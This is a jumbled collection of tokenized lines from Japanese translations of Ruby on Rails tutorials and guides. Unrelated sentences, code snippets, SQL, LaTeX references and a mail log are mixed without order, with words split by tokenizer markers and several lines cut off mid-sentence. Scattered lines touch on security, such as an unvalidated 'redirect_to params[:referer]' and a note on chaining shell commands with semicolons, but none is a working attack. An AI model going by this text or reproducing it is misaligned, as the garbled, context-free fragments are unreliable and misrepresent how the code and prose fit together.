▁( 訳 注 : ▁この 項 は スキップ できます ▟ もし うまく い か なければ スキップ しても 大丈夫 です ) ▁\ ref { sec : image _ resizing } で実装した 画像 アップ ロー ダ ー は 、 開発環境 で 動 か す 分 には 問題 ない のですが 、 本番環境 には 適 していません ▟ これはリスト { p 2 } の {3} storage ▁: file {/3} という 行 によって 、 ローカル の ファイルシステム に 画像 を保存する よう になっている からです { p 4 } ▁( 訳 注 : ▁ただし Heroku の ファイルシステム は 一時 的に しか 使 え 無 い ので 、 本番 にデプロイする たびに 画像 が 消え ます ) 。
▁ delegate ▁: table _ name , ▁to : ▁: class
▁module ▁Blorgh
▁ 先 の例 で 説明したとおり 、 キー が レシーバ と 引数 で 重複 している場合 、 引数 の 側 の 値が 優 先 されます 。
▁ / db /* ▖ sqlite 3- j our n al
▁\ emph { shim } と \ emph { s hi v } という 単語 は 、 今回の 用 途 では どちら でも 大丈夫 です ▟ shim を 意味 は 「 洗 う 機 械 、 も しく は 薄 い 物 質 を 整 理 し フ ィ ッ ト させるため の モ ノ 、 あるいは 服 を削除する こと 」 なので 、 意味 合 い としては 前 者 が 正しい です ▟ ちなみに 後者は 「 ナ イ フ 、 も しく は 武器 として 使う 剃刀 」 という 意味 なので 、 おそらく 原 著者 である ▁S j o er d ▁ V is s ch er の ち ょ っ と した イ タ ズ ラ 心 でしょう 。
▁ success
▁ SELECT ▁view able _ by , ▁ locked ▁FROM ▁clients
▁# ▁== == ▁ Example s
▁\ emph { 範囲 ▁( range )} ▁ は 、 配列 と 密 接 に 関係 しています ▟\ k ode { to _ a } メソッドを使用して 配列 に変換 すると 理解 し やすい と思います 。
▁\ ref { sec : green } で About ページに や った の と同じように 、 Contact ページに も リスト \ ref { code : proposed _ contact _ page } の コンテンツ を表示し ましょう
▁# ▁</ text area >
▁ これによって 、 カレント ユーザーに 所 属 する マイクロポスト だけ が自動的に 見つかる ことが 保 証 されます 。
▁* ▁[ Ruby ▁on ▁Rack ▁# 2 ▁- ▁The ▁ Builder ]( http :// m ▖ on key ▖ org / ruby - on - rack - 2 - the - builder )
▁< form ▁accept - cha r set =" UT F -8 " ▁action ="/ articles " ▁data - remote =" true " ▁method =" post ">
▁Ruby では 、\ k ode { Digest } ライブラリ の \ k ode { hexdigest } メソッド を使用した M D 5 ハッシュ ア ル ゴ リ ズ ム が 実装 されています 。
▁ クエリ 文字列 ▁( 訳 注 : ▁` ? パラメータ 名 = 値 ` の 形式で URL の 末尾に 置かれ る パラメータ ) ▁ で指定されている パラメータ も すべて ` params ` に 含 まれ ます 。
▁# ▁loaded ▁and ▁you ▁are ▁going ▁to ▁fetch ▁the ▁records ▁any way ▁it ▁is ▁better ▁to ▁( どう しても レコード を取り出し たい場合は )
▁`: to ` オプション が 文字列に変換 される と 、 メソッドの 委譲 先 となる オブジェクト に 評価 される 式 になります 。
▁ セキュア パスワード という 手法 では 、 各 ユーザーに パスワード と パスワード の 確 認 を 入力 させ 、 それを ▁( そのまま ではなく ) ▁ 暗号化 したものを データベースに保存 します 。
▁$ ( document )▖ read y ▁->
▁#### # ▁ 追加 の カラム メソッド
▁GitHub と Bitbucket
▁ force ▁config / application ▖ rb
▁------- --------------- ---------------
▁\ k ode { footer } タグ の ルール が 、 劇 的に 向上 している ことを確認 してみてください 。
▁ 計算 の順序 が 異なる 場合 、 同じ 結果 が 得 ら れ ない 可能性があります 。
▁ 本書 では Rails ▁4▖0 を使用します ▟ 以下を実行して インストール してください 。
▁validates ▁: name , ▁presence : ▁true
▁\ k ode { redirect \_ back \_ or } メソッドでは 、 次のように or 演算子 \ k ode {||} を使用します 。
▁xml ▖ em ▁ { ▁xml ▖ b (" emph ▁& ▁ bo ld ") ▁ }
▁上 と同様 、\ k ode { container } クラス も Bootstrap において 特別な 意味 を持ちます 。
▁User の マイクロポストの 集合 を か え す
▁#### ▁` has _ and _ belongs _ to _ many ` 関連付け に対応する 結合テーブル を作成する
▁ いくつかの アプリケーション において は 、 この 初期 実装 だけで 目的 が 達 成 され 、 十分 に 思える かもしれません ▟ しかし リスト \ ref { code : initial _ working _ feed } に はまだ 足 り ない もの があります ▟ それが 何 な のか 、 次の 節 に進む前に 考え てみてください
▁te }╼╼ ▁% ▁subsection ▁creating _ and _ authenticating _ a _ user ▁( end )╼╼ ▁% ▁section ▁adding _ a _ secure _ password ▁( end )╼╼ ▁\ section { 最後に } ╼ ▁\ label { sec : modeling _ users _ co nclusion }╼╼
▁ その他の 変更 は リポジトリ に コミット しましょう 。
▁WARNING : ▁ 引数 が ` I O ` の場合 、 再 試 行 を 可能 に するために ` re w in d ` に応答する 必要があります 。
▁self を省略した 結果を リスト \ ref { code : signed _ in _ p } に示します 。
▁INFO : ▁以下の 計算 方法 の一部 では 1582 年 10 月 を 極 端 な 例として 使用 しています ▟ この 月 に ユ リ ウ ス 暦 から グ レ ゴ リ オ 暦 への 切り 替 え が 行われた ため 、 10 月 5 日 から 10 月 14 日 まで が存在し ません 。
▁ SELECT ▁* ▁FROM ▁articles ▁WHERE ▁id ▁> ▁10 ▁OR DER ▁BY ▁id ▁as c ▁LIMIT ▁20
▁class ▁Article sController ▁< ▁Application Controller
▁たとえば 、 顧客 ( customer ) と 注文 ( order ) を含む Rails アプリケーションでは 、 顧客 の モデルを 以下のように 宣言 することができます 。
▁ バックエンド で MySQL を使用している場合 、 上の セッション によって 以下の SQL が生成されます 。
▁' X - Content - Type - Options ' ▁=> ▁' no sniff '
▁\ k ode { remember } メソッドを User モデル に追加する
▁` config ▖ action _ controller ` には 多数の 設定 が含まれています 。
▁\ k ode { gravatar \_ for } ヘルパー に キーワード 引数 を追加する
▁redirect _ to ▁params [: referer ]
▁Active ▁Job は 、 ジョブ のライフサイクル での フック を提供します 。
▁ 一般的な シナリオ の 1 つ は 、 生成 した コードを 元に戻 したい場合 です ▟ たとえば 、 コントローラを生成 した 後で 、 もっと い い コントローラ 名を 思い 付 い た場合 など です 。
▁<%= ▁content _ for ?( : new s _ content ) ▁?
▁ 送信 が 無効 だった 場合 と 有効 だった 場合 の 画面 をそれぞれ 図 \ ref { fig : password _ reset _ failure } と 図 \ ref { fig : password _ reset _ success } に示します
▁この 状 況 は 、 自 己 結合 関連付け を使用して モデル 化 することができます 。
▁最後に 、 ユーザー を削除し 、 データベースから 完全に 消 去 する 機能 を追加します 。
▁ ある ミドルウェア の 前に 別の ミドルウェア を追加 したい場合は ` insert _ before ` を使用します 。
▁ ソースコード の バージョン管理 は 「\ emph { 何 としても }」 導 入 してください ▟ バージョン管理 は Rails を使用する どんな 場 面 でも 必要 になります し 、 バージョン管理 システム を 応用 して 、 自分の 作成した コードを 他の 開発者 と 簡単に 共有 したり ▁(\ ref { sec : bitbucket }) 、 最初の 章 で作成した アプリケーションを 本番 サーバー へ デプロイ したり すること も できる ▁(\ ref { sec : deploying }) ▁ からです 。
▁ データベースの インデックス を理解する ためには 、 本 の 索 引 と の 類似 性 を 考え ると よいでしょう 。
▁ 小さな ス ター ト アップ から 巨 大 企 業 まで 、 多くの 組 織 が ▁Rails ▁ を使っています ▟ 例えば 、\ href { http :// 37 sign al s ▖ com /}{ 37 sign al s } ▁ や ▁\ href { http :// github ▖ com /}{ GitHub }、\ href { http :// s hopify ▖ com /}{ S hopify }、\ href { http :// s c ri b d ▖ com /}{ S c ri b d }、\ href { http :// twitter ▖ com /}{ Twitter }、\ href { http :// d isney ▖ com /}{ D isney }、\ href { http :// h ul u ▖ com /}{ H ul u }、\ href { http :// y ellow pages ▖ com /}{ Y ellow ▁Pages } ▁ など 、\ href { http :// rubyonrails ▖ org / application s } { Ruby ▁on ▁Rails ▁ を使っている サイトの リスト } は 増え る 一方で す 。
▁たとえば 、 この章 では 、 サイトの ヘッダー 部分 に サインイン / サインアウト のリンク と プロファイル へのリンク を表示する ようにします 。
▁これは 、 RSpec を実行する たびに Rails の 環境 全体 を 読み込み 直 す 必要がある ためです 。
▁### ▁` truncate _ words `
▁ 最後の 部分 では 、 Rails が テンプレート を探し た 場所 が示されています 。
▁ attachments ▖ inline [' image ▖ jpg '] ▁= ▁File ▖ read (' / path / to / image ▖ jpg ')
▁def ▁show
▁` layout ` 宣言 を使用することで 、 デフォルトの レイアウト 名 ルール を上書き することができます 。
▁DELETE
▁╼╼\ section { アプリケーションの 計 画 } ▁% ▁( fold )╼\ label { sec : planning _ the _ application }╼╼
▁変更の結果 を リスト \ ref { code : generate _ users _ controller } に示します 。
▁WARNING : ▁ 既存の Rails アプリケーションを アップグレード する 際に この 機能 を使用すること を 検 討 している場合 は 、 この オプション の 貼 り 付け 先に 十分 ご注意ください ▟ この オプションを 貼 り 付け て よい のは ` production ▖ rb ` と 、 production 環境 として 振 る 舞 わ せ たい 他の 環境 ファイル のみ です ▟ ` application ▖ rb ` ではありません 。
▁ 表 { p 0} で示した {2} edit _ user _ path {/2} という 名前付きルート と 、 ▁リスト \ ref { code : persistent _ current _ user } で定義した {2} current _ user {/2} という ヘルパーメソッド を使うと 、 実装 が 簡単です 。
▁\ href { http :// localhost :3000/ static _ pages / home }{/ static _ pages / home } にアクセス して 結果 を表示します ▁( 図 \ ref { fig : raw _ home _ view }) 。
▁A ure ▁ には 、 RailsSpace ▁ での 協 力 と 本書 への 支 援 も含め 、 感 謝 したい と思います 。
▁` app / views / blorgh / comments ` に ディレクトリ を作成し 、` _ form ▖ html ▖ erb ` という ファイル を作成します ▟ この ファイル の中に 以下の パーシャル を記述し ます 。
▁これらの 関連付け を実装する ための 一 環 として 、 Micropost モデル に対するテスト を作成し 、 さらに User モデルに いくつかの テスト を追加します 。
▁` max - age ` の値 は 秒 単 位 で 指定します ▟ 最大 値は ` 3 15 36 000 ` であり 、 これは 一 年 に相当 します 。
▁NOTE : ▁ ある エンジン に含まれる ` Application Controller ` という クラス の名前 は 、 アプリケーション そのもの が 持つ クラス と同じ 名前 になっています ▟ これは 、 アプリケーションを エンジン に変換 し やすくするため です 。
▁ 動作 の詳細 や 、 この 防 御 が 重要な 理由 を知り たい場合は 、 Stack ▁Overflow の \ href { http :// stack overflow ▖ com / questions / 9 4 1 59 4/ understand - rails - authenticity - token } { Rails 信 頼 性 トークン 関連の 書き込み } ▁( 英語 ) ▁ を参照してください 。
▁ ブラウザから の ` / photos / show /1 ` リクエストが 上の ルーティング で 処理 される ▁( 他の ルーティング 設定 には マッチ し なかった とします ) ▁ と 、` Photos ` コントローラの ` show ` アクション が呼び出され 、 URL 末 尾 の パラメータ ` "1" ` へのアクセス は ` params [: id ]` で 行 な えます 。
▁ 一部の 要素 で 、 以下のように CSS ▁id を指定して い ること にも ぜ ひ 注 目 してください 。
▁@ customer ▖ orders ▖ delete (@ order 1 )
▁ここまで の 進 捗 を Twitter に 投 稿 したり Facebook で 通知 するには 以下の リンク から どう ぞ 。
▁この API は 特定の 値 に コミット しないよう に 注意 が 払 わ れ ており 、 メソッド には 述 語 と 意味 が示されています ▟ これで 十分です 。
▁* ▁` action _ mailer ▖ compile _ config _ methods `: ▁ 指定された 設定 用 メソッドを 初期化 し 、 より 高速 にアクセス できるようにします 。
▁続いて 、 エンジン は 作成 または 見つけ た ` User ` オブジェクトを 記事 と 関連付け ます 。
▁この コードが リスト \ ref { code : signup _ form } と 極めて 似 通 っ ていることに注目してください ▟ 重複 が多い ということは 、 それらの コードの 繰り返し を パーシャル に まとめ る ことができる ということです ▟ パーシャル に まとめ る 作業 は 演習 の 課題 ▁(\ ref { sec : exercises _ edit _ form }) ▁ に回します 。
▁この やりとり の 増 加 による 遅 延 は 、 小 規 模 な アプリケーション であれば おそらく 問題 になり ません が 、 遅 延 が 甚 だ しく な っ てきた 場合には この 点を 改 め る 必要がある かもしれません 。
▁これは 、 メソッド または スコープ への 連 鎖 可能な 応答 が必要 で 、 しかも 結果を 一 切 返 したくない場合 に 便利です 。
▁has _ and _ belongs _ to _ many ▁: assemblies , ▁-> ▁ { ▁where ▁active : ▁true ▁ }
▁# ▁=> ▁" alert (1) "
▁しかし 、 上の 記 法 は Rails 流 ではありません 。
▁INFO : ▁3 つの メソッドは いずれも 、 レシーバ が 空の 場合は ` nil ` を返します 。
▁# ▁self ▖ include _ root _ in _ json ▁= ▁false
▁上の ルーティング では 以下の 6 つの ルーティング が作成され 、 すべて ` G e o code rs ` コントローラ に割り当てられ ます 。
▁次の 2 行 も わかりやす い と思います 。
▁ 私たちは これまで に 、 ルート URL を定義する コードを 3 回 見 てきました ▟ 1 つ目は
▁ セッション cookies を 暗号化 する方法 の詳細については [ P u ll ▁ Request ▁# 99 78 ]( https :// github ▖ com / rails / rails / pull / 99 78 ) ▁ を参照してください 。
▁上の 宣言 は `: id ` パラメータ に 制限 を加え 、 指定した 正規表現 に のみ マッチする ようにします 。
▁# ▁assign ▁false ▁instead ▁of ▁true ▖
▁select _ date ()
▁TIP : ▁` update ` に 属性 をすべて 渡す 必要はありません 。
▁Active ▁Record ▁ バリデーション
▁# ▁`: info ` を指定すると 現在の デフォルト 設定 が使用され 、
▁ユーザー 編集 用の ページ ▁(\ href { http :// localhost :3000/ users /1/ edit }{/ users /1/ edit })
▁\ k ode { before _ save } コールバック 内で \ k ode { email ▖ downcase !} と 書き 、\ k ode { email } 属性 を直接 変更 しても よい ことを 、 テストスイート を 走 ら せ て 確認してください ▁( リスト \ ref { code : downcase _ bang } のように 書 いて も よい ことを 、 テストスイート を実行して 確認してください 。
▁NOTE : ▁この ` has _ many ` は ` Blorgh ` モジュール の中に ある クラス の中で 定義 されています ▟ これ だけで 、 これらの オブジェクトに対して ` Blorgh :: Comment ` モデル を使用した い という 意図 が Rails に 自動的に 認 識 されます ▟ 従って 、 ここで `: class _ name ` オプション を使用して クラス名 を指定する 必要はありません 。
▁Rails ▁4▖1 では 、 PostgreSQL の ` json ` カラム と ` h store ` カラム を 、 文字列を キー と する Ruby の ` Hash ` に 対応 付ける ようになりました 。
▁<%= ▁image _ tag ▁ attachments [' image ▖ jpg '] ▖ url ▁%>
▁rake で 実行 可能な タスク をすべて 表示する には 以下を実行し ます 。
▁ 行 を 分割 した \ emph { 理由 } は 、1 行 を 80 字 以 内に 収 めて ソースコード を 読み やすくするため です
▁POST ▁ / users (▖ : format ) ▁users # create
▁ 今回は 種類 = \ k ode { string } の \ k ode { remember \_ digest } 属性 を追加し ているので 、 いつものように Rails によって デフォルトの マイグレーション が 作成されます ▁( リスト \ ref { code : add _ remember _ digest _ to _ users _ generated }) 。
▁もし 行 き 詰 ま っ てしまった ら 、 すぐに この 演習 を 飛 ば して 次の 作業 に 進 んで ください ▟ なお 、 既に 説明したとおり 、 この チュートリアル で 開発 している サンプルアプリケーション は 、 SQLite と PostgreSQL のどちら についても 完全に 互換性 があります 。
▁\ k ode { create !} は 基本的に \ k ode { create } メソッド と同じ ものです が 、 ユーザーが 無効な 場合に \ k ode { false } を返す の ではなく 例外を発生 させる ▁(\ ref { sec : find ing _ user _ objects }) ▁ 点 が異なります 。
▁ assoc ▖ has _ many ▁: customers
▁Cucumber と 結合テスト で それぞれ どのように 実装 されている か が お わ か り いた だけ る と思います 。
▁ 詳細は 第 \ ref { cha : sign _ up } 章 でも 説明します が 、 上で 見た ように モデルの 生成 と 保存 を 2 つの ステップ に分け ておく と 何か と 便利です ▟ しかし 、 Active ▁Record では \ k ode { User ▖ create } で モデルの 生成 と 保存 を 同時に お こ な う 方法 も 提供され ています 。
▁上 は あくまで ガイドライン であり 、 最適な 使用 方法 については 各 自 で ご 判 断 ください 。
▁unless : ▁ Proc ▖ new ▁ { ▁| c | ▁c ▖ track p ad ▖ present ?
▁これは 、 ほとんどの シェル では 、 コマンド に セ ミ コロン ; や 垂 直 バー | を追加する ことで 、 別の コマンド を簡単に 結合 する ことができ てしまう ためです 。
▁#### ▁ 新しい JSON エ ン コ ー ダ
▁\ href { http :// gravatar ▖ com /}{ Gravatar } の 画像 調 整 インターフェイス ▁( 写 真 は \ href { http :// www ▖ michael hartl ▖ com /}{ 誰 か さ ん })
▁ 数値 に 3 桁 ご と の 桁 区切り 文字 を追加します 。
▁しかし 、\ ref { sec : a _ problem _ with _ the _ data _ model } で 指 摘 した ように 、\ k ode { user ▖ followed s } という 名前 は 英語 として 不 適切 です ▟ 代わりに 、\ k ode { user ▖ following } という 名前 を使い ましょう 。
▁render ▁template : ▁" books / edit ▖ html ▖ erb "
▁ では 、 それぞれ を 順に 見 ていきましょう 。
▁=> ▁" foo "
▁この コレクション を 作る ために 、 以下の コンソール セッション に示した ような 、 文字列 の配列 を簡単に 作 れる \ k ode { \ % w [ ]} という 便利な テクニック を 知 っ ておく と 良い でしょう 。
▁* ▁FROM ▁clients ▁ LE F T ▁ OUT ER ▁JOIN ▁addresses ▁ ON ▁addresses ▖ client _ id ▁= ▁clients ▖ id
▁<%= ▁link _ to ▁' P at i ent ▁Record ', ▁ patient _ path (@ patient ) ▁%>
▁< a ▁ href =" ▖▖▖" ▁data - no - t ur bo link > N o ▁ turbolinks ▁here </ a > ▖
▁\ k ode { full \_ title } ヘルパー のテスト
▁ 今後 の 章では 、 ブランチ や コミットメッセージ は もちろん 異なります が 、 基本的な アイディア は 同じです 。
▁{0} 図 2 ▖9{/0} {1} 2 人目のユーザー が追加された 一覧 ページ ▁(\ href { http :// localhost :3000/ users }{/ users })▟ \ href { http :// railstutorial ▖ org / images / figures / demo _ user _ index _ two _ rails _ 3- full ▖ png }{( 拡大 ) }{/1}
▁ ヒント と 注意 事 項
▁validates ▁: m ous e , ▁presence : ▁true ,
▁( これが 上で 述 べ た セキュリティホール です ) ▁ 。
▁上のように 、 Rails には \ text tt { Rails } という オブジェクト があり 、 それ には 環境 の 論理値 ▁( boolean ) ▁ を 取 る \ text tt { env } という 属性 があります ▟ たとえば 、\ text tt { Rails ▖ env ▖ test ?} は テスト 環境では \ text tt { true } を返し 、 それ以外の 環境では \ text tt { false } を返します 。
▁ Array ▖ wrap (0) ▁# ▁=> ▁[ 0 ]
▁`@ products ` が ` product ` インスタンス の コレクション である と すると 、` index ▖ html ▖ erb ` に 以下のように 書くこと で 同じ 結果を 得られます 。
▁もし この テストが 少し 抽 象 的 すぎる と 感じ る なら 、 Rails コンソール を 起動 して 確認し ましょう 。
▁$ ▁bundle ▁exec ▁rails ▁new ▁~/ my - test - app ▁-- dev
▁ 先ほど の 3 つの 条件 を アサーション に変換 して 、 User モデル ▁( リスト \ ref { code : proto _ status _ feed }) ▁\ k ode { feed } メソッド がある ことに 注意 しながら 、 更新 した User モデル に対するテスト を書いて みましょう ▟ 結果を リスト \ ref { code : full _ feed _ test } に示します 。
▁* ▁Active ▁Record の モデル 同士 の 関連付けを 宣言 する方法
▁* ▁`: delete ` ▁-- ▁ オブジェクトが destroy される と 、 関連付けられたオブジェクト はすべて 直接 削除 されます ▟ このとき オブジェクトの ` destroy ` メソッドは 呼び出され ません 。
▁#### ▁ 何も 出力 しない 方法
▁Rails が 返す レスポンス の HTTP ステータスコード は自動的に 生成されます ▁( ほとんどの場合 ` 200 ▁OK ` となります ) 。
▁ デフォルトの \ k ode { Gemfile } を テキストエディタ で 開 く 。
▁class ▁User
▁{0}{1} リスト 2▖1 5 {/1}{/0} と {2}{1} リスト 2▖1 6 {/1}{/2} を 比較してみると 、 Users コントローラと Microposts コントローラは いずれも Application Controller を継承し ています 。
▁たとえば ▁" 小さい " ▁ 画像 を表示する だけ な の に 、 や たら に 読み込み 時間 が 長い ウェブ サイトに 訪 れ た ことはありません か 。
▁` image _ tag ` の場合と同様 、 絶 対 パス または ` public / video s ` ディレクトリ からの 相 対 パス を指定できます 。
▁development 環境 に いくつかの 新しい 設定 を追加する 必要があります 。
▁たとえば 、\ k ode { : success } と \ k ode { : error } という ▁2 つの 状態 を持つ ▁\ k ode { flash } ▁ という名前の ハッシュ について 考えてみましょう 。
▁has _ one ▁: account , ▁class _ name : ▁" Billing "
▁( 技術 的な 理由 により 、\ k ode { rails } コマンド だけ は 例外 です ) 。
▁$("# re s ul t s ")▖ append ▁ html
▁ エンジン をテストする
▁ マイグレーション ファイル の名前 には タイムスタンプ が含まれ ており 、 これ に基いて 、 マイグレーション は 作成された 順に 実行されます 。
▁ 特に 、 Heroku の ファイル スト レ ー ジ は 一時 的な ので 、 アップロード した 画像 は デプロイ する 度 に 削除 される 仕 様 になっています ▁( 訳 注 : ▁ とは い え 、 アプリケーションの 動作を 本番環境で 確 認 するだけで あれば 、 Heroku の ファイル スト レ ー ジ のまま でも 問題 はありません ) 。
▁ 以下 でも わかるように 、 スコープ での メソッド の設定 は 、 クラスメソッド の定義 と 完全に 同じ ▁( という より クラスメソッド の定義 そのもの ) ▁ です ▟ どちらの 形式 を使用する か は 好 み の 問題 です 。
▁* ▁` update `
▁ 残 る 制 約 は 、 メールアドレスが 一意 であること を強制する もの だけ となり ました 。
▁ アカウント有効化 に使用する リソース を追加する
▁デフォルトでは ▁id 順に 並 ぶ ため \ k ode { [ ol d er _ micropost , ▁new er _ micropost ]} の順序 になり テストは 失敗する はずです 。
▁ サインイン していない ユーザーは 、\ text tt { POST } リクエストを / microposts ▁(\ k ode { post ▁microposts _ path }、\ k ode { create } アクション が 呼び出される ) ▁ に 送信 した 場合 、 または ▁\ text tt { DELETE } リクエストを / microposts /1 ▁(\ k ode { delete ▁micropost _ path ( micropost ) }、\ k ode { destroy } アクション が 呼び出される ) ▁ に 送信 した 場合に リダイレクト されます 。
▁次の 第 \ ref { cha : sign _ up } 章では 、 ユーザー を作成するための ユーザー登録フォーム を作成し 、 各 ユーザーの 情報 を表示する ための ページ も 作成します 。
▁この \ k ode { heroku } コマンド を実行すると 、 Rails アプリケーション 専 用の サブドメイン が作成され 、 ただ ち に ブラウザで 表示 可能 になります 。
▁最初に 、 以下 に従って RVM のバージョン を 最新 に します 。
▁第 \ ref { cha : sign _ up } 章 ▁ では 、 ▁ ハッシュ 引数 を使用して オブジェクトを 初期化 します ▟ これは 一般に \ emph { マスアサインメント ▁( mass ▁assignment )} ▁ と呼ばれる 技 法 で 、 Rails アプリケーションで 多 用 されています 。
▁ チェックボックス が オン の ときに \ k ode { ’ 1 ’} になり 、 オフ の ときに \ k ode { ’ 0 ’} になります 。
▁ パーシャル は データ の 繰り返し ▁( コレクション ) ▁ を出力する 場合にも きわめて 便利です 。
▁options ▁= ▁options ▖ reverse _ merge ( length : ▁30 , ▁omission : ▁" ▖▖▖" )
▁ 本書 には 、 そう した 方 々 が 初めて Rails を 学 んだ 頃 よりも 新しい 技術 が ふ んだ ん に 盛 り 込 まれ ている ため 、 本書 で 学ぶ 技術 は き っ と 役に立 つ はずです 。
▁Git を使用している 方は 、 し ば ら く コミット して い なかった のであれば 、 この時点で コミット しておく のが よいでしょう 。
▁Users コントローラは 、 作成 時に 既に \ k ode { new } アクション を持っている ため 、 後 は テストをパスさせ るために 正しい ルート と ビューの 中 身 を作成 すればよいのです 。
▁詳細については 、 Stack ▁Overflow の 「\ href { http :// stack overflow ▖ com / questions / 53 59 5 58 / when - to - use - rspec - let } { どんな ときに let を使用 すべき か } ▁( 英語 )」 を参照してください 。
▁ ルーティング を作成する と 、 ルーティングヘルパー も 作成されます ▟ ヘルパーは ` magazine _ ads _ url ` や ` edit _ magazine _ ad _ path ` のような 名前 になります 。
▁ 技術 的に は 、 アセットパイプライン は既に Rails ▁4 の コア 機能 ではありません ▟ フレームワーク から 分 離 され 、[ sprockets - rails ]( https :// github ▖ com / rails / sprockets - rails ) という gem に 書き 出 されています 。
▁create _ table ▁: part s ▁do ▁| t |
▁ モジュール が 無名 または トップレベル の場合 、` parent ` は ` Object ` を返します 。
▁ユーザーの ビュー と アクション が 定義された ので 、 URL ▁\ href { http ://0▖0▖0▖0:3000/ users /1}{/ users /1 } ▁ は 完全に 動作する ようになりました ▁( 図 \ ref { fig : user _ show _ rails }) 。
▁ これはリスト \ ref { code : user _ factory } で使用されていました 。
▁これ に対応する アプリケーション 側 の実装 は 、 User の \ k ode { name } 用 バリデーション ▁( リスト \ ref { code : length _ validation }) ▁ と 全 く 同じです ▟ リスト \ ref { code : micropost _ validations } に 結果 を示します 。
▁なお 、 このとき 、\ k ode { : destroy } ▁ も ▁\ k ode { signed _ in _ user } ▁ の ▁before _ action ▁ に追加し ています 。
▁class ▁ Account H is to ry ▁< ▁ActiveRecord :: Base
▁* ▁` select `
▁| ▁` Rails :: Rack :: Debugger ` ▁| ▁ デ バ ッ ガ を 起動 する ▁|
▁No ▁route ▁matches ▁[ GET ] ▁"/ static _ pages / about "
▁これらの テストは 、 RSpec で 使われ る \ emph { 論理値 の慣習 } に依存し ています ▟ 以下のコード は 、
▁ 新しい セッション の フォーム が 再度 表示され 、 フラッシュメッセージ が 追加される ことを確認する
▁<%= ▁link _ to ▁' Magazine ▁details ', ▁@ magazine ▁%>
▁<%= ▁render ▁partial : ▁" product ", ▁collection : ▁@ products , ▁layout : ▁" special _ layout " ▁%>
▁S ent ▁mail ▁to ▁ michael @ michael hartl ▖ com ▁( 9 3 1 ▖ 6 m s )╼ Date : ▁We d , ▁0 3 ▁Sep ▁2014 ▁ 19 : 4 7 : 18 ▁+0000 ╼ From : ▁no reply @ example ▖ com ╼ To : ▁ michael @ michael hartl ▖ com ╼ Message - ID : ▁< 5407704 7 4 e 16 _ 6 1 d 3 fd 19 14 f 4 cd 0 3 00 a 0 @ mhartl - rails - tutorial - 9 5 37 53 ▖ mail >╼ S ub j ec t : ▁ Account ▁activation ╼ M i me - Version : ▁1▖ 0 ╼ Content - Type : ▁ multipart / alternative ; ╼ ▁b ound ary =" - - == _ mime part _ 5407704 656 b 50 _ 6 1 d 3 fd 19 14 f 4 cd 02 99 6 a " ; ╼ ▁ cha r set = UT F -8 ╼ Content - Transfer - Encoding : ▁7 bit ╼ ╼╼ - --- == _ mime part _ 5407704 656 b 50 _ 6 1 d 3 fd 19 14 f 4 cd 02 99 6 a ╼ Content - Type : ▁text / plain ; ╼ ▁ cha r set = UT F -8 ╼ Content - Transfer - Encoding : ▁7 bit ╼╼ H i ▁ Michael ▁Hartl , ╼╼ Welcome ▁to ▁the ▁ Sample ▁App !
▁ 辞書 順 に基いて 生成された 結合テーブル のデフォルト 名 が 気 に 入 らない 場合 、`: join _ table ` オプション を使用して デフォルトの テーブル名 を上書き できます 。
▁` app / assets / javascripts ` ディレクトリ にある JavaScript ファイル名 ▁( 拡張子 ` ▖ js ` は あって も なくても 構 いません ) ▁ を 引数として 渡す ことができます ▟ この 結果は 現在の ページに インクルード されます ▟ ドキュメント ルート からの 相 対 完 全 パス を 渡す こともできます 。
▁この アセットを サーバー クラス タ にデプロイする と 、 サーバー 間 で ファイルの タイムスタンプ が 同じ になる 保 証 がない ため 、 リクエスト を受け る サーバー が 変わる たびに 値が 異 なってしまい ます 。
▁ 恥 を 忍 んで 申し上げ ると 、 筆者 が 自分自身 で リスト \ ref { code : remember _ me _ ternary } で チェックボックス の 処理 を実装 した ときは 、
▁Rails で アセット ホスト を設定する には 、` config / production ▖ rb ` の ` config ▖ action _ controller ▖ asset _ host ` を 以下のように 設定 します 。
▁上のコード にある 、 以下の 特殊な コード にご注目ください 。
▁* ▁ データベース : ▁Rails は データベースから 読み だ した データを 境 界 上で UT F -8 に変換 します 。
▁{0} 図 2▖ 4 ▁{/0}{1} Users リソース ▁(\ href { http ://0▖0▖0▖0:3000/ users }{/ users }) ▁ ページ の最初の 状態 {/1}
▁たとえば ` Client ▖ where ( status : ▁: active ) ` のような 書き 方は できません 。
▁<%= ▁f ▖ text _ area ▁: body ▁%>
▁上のコードは 、 作成する ユーザーの メールアドレスを デフォルト と 異なる もの に 変更します 。
▁def ▁valid ?(
▁デフォルトは ` - i ▁- t ` です 。
▁ このような コードの 重複 は 、「 重複 して はならない 」( Don ’ t ▁R epeat ▁Your self , ▁ DRY ) ▁という 重要な 原 則 に 反 しています ▟ 以後 、 この節 と 次の 節 では 重複 を 取り 除 き 、 コードを DRY に していきます 。
▁ フィクスチャ では ERB を 利用できる 点にご注目ください 。
▁| ▁| ▁4 17 ▁| ▁: expect ation _ failed ▁|
▁ 具体的には 以下の 変換 を行います 。
▁Home ページ への ルート マッピング を作成する 際に 、 以下のような コードを 使用 \ emph { すること も 一 応 可能です } 。
▁ 幸 い 、\ k ode { : uniqueness } では \ k ode { : case \_ sensitive } という 打 って つ け の オプション が 使用できます ▁( リスト \ ref { code : validates _ uniqueness _ of _ email _ case _ insensitive } }) 。
▁このコードは リスト \ ref { code : login _ upon _ signup } で使用されていました ▟ もうひとつ 、
▁| ▁| ▁30 8 ▁| ▁: permanent _ redirect ▁|
▁\ text tt { will _ paginate } ▁gem は 広 く 使用 されて いて 実 績 も あるので 、 徹 底 的に テスト する必要はありません ▟ ここでは 簡単な テスト を行う ことにします 。
▁* ▁Rails ▁4▖0 では S trong ▁Parameters の導入に伴い 、` attr _ accessible ` と ` attr _ protected ` が 廃 止 されました 。
▁Active ▁Record ▁ クエリ インターフェイス
▁ サンプルアプリケーション を生成する
▁今度は \ k ode { current \_ user } を 以下のように 定義 し 直 します 。
▁ スペース や 共通 スタイル を追加した 結果
▁つまり 、 ユーザーは プロファイル ページを 最初に 表示 し 、 それ から ユーザーを フォロー し 、 その後 すぐ 元の ページ にリダイレクトされる という 流れ になります 。
▁create ▁app
▁最初の 一番 重要な ステップ は 、 サイトの ユーザー用の \ emph { データモデル } の作成 と 、 データを 保存 する手段 の 確 保 です 。
▁ デフォルトの ヘッダー は ` config / application ▖ rb ` で 設定 を変更 できます 。
▁Help ページ の内容 をテストする コード を追加する 。
▁ アプリケーションの 設定
▁ 更新 した \ k ode { Gemfile } を リスト \ ref { code : will _ paginate _ gem } に示します 。
▁class ▁My Mailer ▁< ▁ ActionMailer :: Base
▁The ▁tests ▁look ▁good ▁too ▖ ▁( テスト も よく 書 け ている よう です ) 。
